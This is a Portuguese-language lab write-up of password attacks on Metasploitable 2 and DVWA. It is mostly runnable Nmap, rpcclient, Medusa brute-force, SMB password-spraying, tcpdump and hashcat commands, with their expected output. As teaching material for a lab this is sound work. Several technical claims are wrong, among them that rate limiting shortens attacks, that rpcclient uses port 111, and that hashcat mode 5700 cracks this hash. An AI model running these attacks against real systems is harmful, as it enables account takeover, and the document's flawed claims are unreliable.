# 🔬 Análise Técnica Detalhada dos Testes

Este documento apresenta uma análise técnica completa de cada ataque realizado, incluindo comandos exatos, interpretação de resultados e capturas de tráfego.

---

## 📌 Índice

1. [Reconhecimento Inicial (Nmap)](#1-reconhecimento-inicial-nmap)
2. [Ataque FTP com Medusa](#2-ataque-ftp-com-medusa)
3. [Ataque a Formulário Web (DVWA)](#3-ataque-a-formulário-web-dvwa)
4. [SMB Enumeration & Password Spraying](#4-smb-enumeration--password-spraying)
5. [Análise de Logs e Artefatos](#5-análise-de-logs-e-artefatos)

---

## 1. Reconhecimento Inicial (Nmap)

### 1.1 Scan Básico da Rede

**Objetivo:** Descobrir máquinas ativas na rede local

```bash
# Scan simples de ping (rápido)
nmap -sn 192.168.56.0/24

# Saída esperada:
# Nmap scan report for 192.168.56.1 (gateway)
# Nmap scan report for 192.168.56.10 (Kali Linux)
# Nmap scan report for 192.168.56.102 (Metasploitable 2)
```

**Interpretação:**
- `-sn` = Ping scan (sem port scan, apenas detecção de hosts)
- Identifica quais IPs estão ativos na rede

---

### 1.2 Scan de Portas Abertas

**Objetivo:** Mapear serviços e portas no Metasploitable

```bash
# Scan de portas comuns com detecção de versão
nmap -sV -p- 192.168.56.102 -oN nmap-results.txt

# Variação: Top 20 portas (mais rápido)
nmap -sV --top-ports 20 192.168.56.102
```

**Saída típica do Metasploitable:**
```
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 2.3.4
22/tcp    open  ssh        OpenSSH 4.7p1 Debian
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
53/tcp    open  domain     ISC BIND 9.4.2
111/tcp   open  rpcbind    2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
3306/tcp  open  mysql      MySQL 5.0.51b-24+lenny5
5432/tcp  open  postgres   PostgreSQL DB 8.2.5 - 8.2.23
6667/tcp  open  irc        UnrealIRCd
8080/tcp  open  http       Apache httpd 2.2.8 ((Ubuntu))
```

**O que aprendemos:**
- FTP (21), SMB (139/445) e HTTP (8080) estão disponíveis
- Versões desatualizadas = potencial para exploração
- Múltiplos serviços = superfície de ataque expandida

---

### 1.3 Scan de Scripts Específicos

```bash
# Enumerar usuários SMB
nmap -p 139,445 --script smb-enum-users.nse 192.168.56.102

# Enumerar compartilhamentos SMB
nmap -p 139,445 --script smb-enum-shares.nse 192.168.56.102

# Detectar OS
nmap -O 192.168.56.102

# Output esperado do smb-enum-users:
# | smb-enum-users:
# |   METASPLOITABLE\backup (RID: 1068)
# |   METASPLOITABLE\bin (RID: 1004)
# |   METASPLOITABLE\daemon (RID: 1000)
# |   METASPLOITABLE\msfadmin (RID: 1000)
# |   METASPLOITABLE\postgres (RID: 108)
# |   METASPLOITABLE\sys (RID: 3)
# |   ...
```

---

## 2. Ataque FTP com Medusa

### 2.1 Preparação

#### Wordlist
Arquivo `wordlists/common-passwords.txt`:
```
password
123456
admin
msfadmin
root
kali
test
letmein
welcome
monkey
```

**Tamanho mínimo:** 10 senhas (para laboratório)

#### Verificação do serviço FTP

```bash
# Testar conexão FTP manualmente
ftp 192.168.56.102

# Esperado:
# 220 (vsFTPd 2.3.4)
# Name: msfadmin
# Password: msfadmin
# ftp> exit
```

---

### 2.2 Ataque com Medusa

#### Comando Básico
```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/common-passwords.txt -M ftp
```

**Flags explicadas:**
- `-h` = Host (IP do alvo)
- `-u` = Usuário específico
- `-P` = Caminho para arquivo com senhas
- `-M` = Módulo (ftp, ssh, smbnt, web-form, etc.)
- `-e` = Tentar senha = usuário (padrão)
- `-v` = Verbosidade (6 = máximo detalhamento)

#### Comando Completo com Logs

```bash
# Executar com saída detalhada e log
medusa -h 192.168.56.102 -u msfadmin -P wordlists/common-passwords.txt \
  -M ftp -e ns -v 6 -O medusa-ftp-attack.log

# Flags adicionais:
# -e ns = Tentar null password (-n) e password = username (-s)
# -v 6 = Verbose level máximo
# -O = Output file para logs
```

---

### 2.3 Interpretação de Resultados

#### Sucesso Esperado:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Cenários Possíveis:

| Resultado | Significado |
|-----------|------------|
| `SUCCESS` | Credencial correta encontrada |
| `TIMEOUT` | Host não respondeu no tempo limite |
| `ACCESS DENIED` | Autenticação falhou (tente próxima) |
| `FAILURE` | Todas as senhas testadas falharam |

---

### 2.4 Análise de Tempo

```bash
# Medir tempo de execução
time medusa -h 192.168.56.102 -u msfadmin -P wordlists/common-passwords.txt -M ftp

# Exemplo de saída:
# real    0m35.234s
# user    0m2.145s
# sys     0m1.023s
```

**Análise:**
- 10 senhas × ~3 segundos por tentativa = 30 segundos aprox.
- Com 100 senhas: ~300 segundos (5 min)
- Com 10.000 senhas: ~50.000 segundos (14 horas)

**Proteção:** Rate limiting reduz este tempo exponencialmente

---

## 3. Ataque a Formulário Web (DVWA)

### 3.1 Setup do DVWA

#### Instalação (Recomendado via Docker):
```bash
# Pull da imagem Docker
docker pull vulnerables/web-dvwa

# Executar container
docker run -it -p 80:80 vulnerables/web-dvwa

# Acesso: http://localhost/login.php
# Default: admin / password
```

---

### 3.2 Análise do Formulário

#### Inspecionar Requisição HTTP (Browser Dev Tools)

Ao fazer login manualmente:

```
POST /login.php HTTP/1.1
Host: 192.168.56.102
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login
```

**Parâmetros identificados:**
- Campo username: `username`
- Campo password: `password`
- Botão submit: `Login`
- Nenhuma validação de CSRF (nível Low)
- Nenhuma autenticação de sessão pré-login

---

### 3.3 Ataque com Medusa (Módulo web-form)

#### Comando para DVWA:

```bash
# Ataque básico (assumindo válido no nível Low)
medusa -h 192.168.56.102 -u admin -P wordlists/common-passwords.txt \
  -M web-form -m FORM:/login.php \
  -m FORM-USERNAME:username \
  -m FORM-PASSWORD:password \
  -v 6

# Parâmetros web-form:
# FORM:/login.php = Arquivo PHP contendo o formulário
# FORM-USERNAME = Nome do campo de usuário
# FORM-PASSWORD = Nome do campo de senha
```

#### Com Parâmetros Adicionais (Se houver Token CSRF):

```bash
medusa -h 192.168.56.102 -u admin -P wordlists/common-passwords.txt \
  -M web-form -m FORM:/login.php \
  -m FORM-USERNAME:username \
  -m FORM-PASSWORD:password \
  -m FORM-PARAMETERS:csrf_token=GET \
  -v 6
```

---

### 3.4 Captura de Tráfego com Wireshark/TCPDump

#### Registrar tráfego:
```bash
# Iniciar captura
sudo tcpdump -i eth0 -w dvwa-traffic.pcap host 192.168.56.102

# Executar ataque Medusa
medusa -h 192.168.56.102 -u admin -P wordlists/common-passwords.txt -M web-form ...

# Parar captura (Ctrl+C)

# Analisar offline
wireshark dvwa-traffic.pcap
```

**O que observar:**
- Múltiplas requisições POST para `/login.php`
- Senhas transmitidas em texto plano (sem HTTPS)
- Nenhuma throttling de requisições

---

### 3.5 Diferenças Por Nível DVWA

| Nível | Proteção | Ataque |
|-------|----------|--------|
| **Low** | Nenhuma | Ataque funciona rapidamente |
| **Medium** | Rate limiting + sleep | Ataque mais lento (~1 req/seg) |
| **High** | CAPTCHA + Account lockout | Ataque falha/bloqueado |
| **Impossible** | CSRF token + MFA | Impenetrável |

---

## 4. SMB Enumeration & Password Spraying

### 4.1 Enumeration de Usuários SMB

```bash
# Nmap script para enumerar usuários
nmap -p 139,445 --script smb-enum-users.nse 192.168.56.102

# Saída esperada:
# | smb-enum-users:
# |   METASPLOITABLE\backup
# |   METASPLOITABLE\bin
# |   METASPLOITABLE\daemon
# |   METASPLOITABLE\games
# |   METASPLOITABLE\man
# |   METASPLOITABLE\msfadmin
# |   METASPLOITABLE\mysql
# |   METASPLOITABLE\ntp
# |   METASPLOITABLE\postgres
```

**Alternativa: rpcclient**
```bash
# Enumerar via RPC na porta 111
rpcclient -U "%" -N 192.168.56.102

> enumdomusers
S-1-5-21-... User: [root] RID: [500]
S-1-5-21-... User: [msfadmin] RID: [1000]
...
```

---

### 4.2 Salvar Usuários em Wordlist

Criar arquivo `wordlists/users.txt`:
```
backup
bin
daemon
games
man
msfadmin
mysql
ntp
postgres
root
sync
uucp
www-data
```

---

### 4.3 Password Spraying com Medusa

#### Comando:
```bash
# Password Spraying: uma senha contra múltiplos usuários
medusa -h 192.168.56.102 -U wordlists/users.txt -p msfadmin -M smbnt -v 6

# Alternativa com múltiplas senhas (melhor para evitar lockout):
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/common-passwords.txt \
  -M smbnt -t 4 -v 6

# Flags:
# -U = Arquivo com lista de usuários
# -p = Uma senha específica para testar contra todos
# -t 4 = 4 threads paralelas (ajustar conforme rede)
```

---

### 4.4 Análise de Resultados

#### Esperado para Metasploitable:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: root Password: [same as above] [SUCCESS]
```

#### Por Que Password Spraying?

**Brute Force Tradicional:**
```
Usuario: msfadmin
Senha Tentativa 1: password123  ❌
Senha Tentativa 2: qwerty      ❌
Senha Tentativa 3: msfadmin    ✅
Tempo: ~10 segundos
Alertas: 30+ requisições suspeitas do IPX against msfadmin
```

**Password Spraying:**
```
Senha: P@ssw0rd
Usuario 1: admin        ❌
Usuario 2: backup       ❌
Usuario 3: msfadmin     ❌
Usuario 4: root         ❌
...
Tempo total: ~20 segundos
Alertas: dispersos entre múltiplos usuários (menos suspeito)
```

---

## 5. Análise de Logs e Artefatos

### 5.1 Logs do Medusa

```bash
# Log completo com timestamps
cat medusa-ftp-attack.log

# Filtrar apenas sucessos
grep "SUCCESS" medusa-ftp-attack.log

# Contar tentativas por segundo
grep "ATTEMPT" medusa-ftp-attack.log | wc -l
```

---

### 5.2 Logs do Sistema (Metasploitable)

```bash
# SSH into Metasploitable
ssh msfadmin@192.168.56.102

# Ver logs de autenticação
sudo tail -f /var/log/auth.log
# Esperado: Failed password for [user] from 192.168.56.10

# Ver conexões FTP
sudo tail -f /var/log/vsftpd.log

# Ver tentativas SMB
sudo tail -f /var/log/samba/log.smbd
```

---

### 5.3 Ferramenta de Análise: Wireshark

```bash
# Capturar tráfego durante ataque
sudo tcpdump -i eth0 -w attack.pcap

# Análise em tempo real
sudo tcpdump -i eth0 -n 'tcp port 21 or tcp port 445'

# Seguir stream de TCP (ver dados do login)
# Abrir em Wireshark → Follow → TCP Stream
```

**Observações Típicas:**
- FTP transmite credenciais em texto plano (INSEGURO)
- SMB usa hashing (NTLM), mas vulnerável a relays
- HTTP sem SSL transmite tudo em texto plano

---

### 5.4 Geração de Relatório

```bash
# Consolidar resultados
echo "=== RELATÓRIO DE TESTES ===" > report.txt
echo "" >> report.txt
echo "1. SERVIÇOS DESCOBERTOS:" >> report.txt
nmap -sV --top-ports 20 192.168.56.102 >> report.txt
echo "" >> report.txt

echo "2. USUÁRIOS ENUMERADOS:" >> report.txt
nmap -p 139,445 --script smb-enum-users.nse 192.168.56.102 >> report.txt
echo "" >> report.txt

echo "3. CREDENCIAIS COMPROMETIDAS:" >> report.txt
grep "SUCCESS" medusa-*.log >> report.txt

# Visualizar relatório
cat report.txt
```

---

## 🎓 Lições Técnicas Importantes

### 1. **Taxa de Tentativas vs Detecção**
- Medusa padrão: ~3 tentativas por segundo
- IDS típico: alerta em >10 tentativas falhas em 1 minuto
- Mitigation: rate limiting no servidor

### 2. **Protocolo FTP é Inseguro**
```
FTP não criptografa credenciais:
CLIENT > USER msfadmin
CLIENT > PASS msfadmin
SERVER > 230 Login OK
(Tudo em texto plano na rede!)
```

### 3. **Importância de Wordlists**
- Wordlist pequena (10 senhas): 30 segundos
- Wordlist grande (100k senhas): 50+ horas
- Wordlists com senhas comuns: altamente efetivas (~40% taxa de sucesso)

### 4. **Diferença Significativa: Online vs Offline**
- **Ataque Online:** Testa contra servidor vivo (Medusa) - LENTO
- **Ataque Offline:** Testa contra hash capturado (Hashcat) - RÁPIDO
  ```bash
  # Hash capturado via SMB relay
  msfadmin:1000:E52CAC67419A6A9A6A3B49B8A74FF03B:...
  
  # Crack offline
  hashcat -m 5700 -a 0 hash.txt wordlist.txt
  # Resultado em segundos
  ```

---

## 📊 Comparativo de Performance

| Vetor | Tempo | Sucesso | Detecção |
|-------|-------|---------|----------|
| FTP Brute Force (10 senhas) | 30s | ✅ Alta | ⚠️ Alta |
| FTP Brute Force (1k senhas) | 50min | ✅ Muito alta | 🔴 Certeza |
| DVWA nível Low (10 senhas) | 10s | ✅ Alta | ⚠️ Baixa (sem logs HTTP) |
| DVWA nível High (10 senhas) | Timeout | ❌ Nula | 🟢 CAPTCHA bloqueia tudo |
| SMB Spraying (13 users, 5 senhas) | 60s | ✅ Média | ⚠️ Dispersa |
| SMB Spraying (13 users, 10k senhas) | 10+ horas | ✅ Variável | 🟢 Detectável em breve |

---

## ✅ Checklist de Verificação

- [ ] Nmap descobriu serviços no Metasploitable
- [ ] Medusa encontrou credenciais FTP
- [ ] DVWA foi acessado via ataque ao formulário
- [ ] Logramos enumerar usuários SMB
- [ ] Password spraying funcionou
- [ ] Logs foram capturados e analisados
- [ ] Wireshark capturou tráfego relevante
- [ ] Relatório foi gerado

---

**Última atualização:** 22 de março de 2026
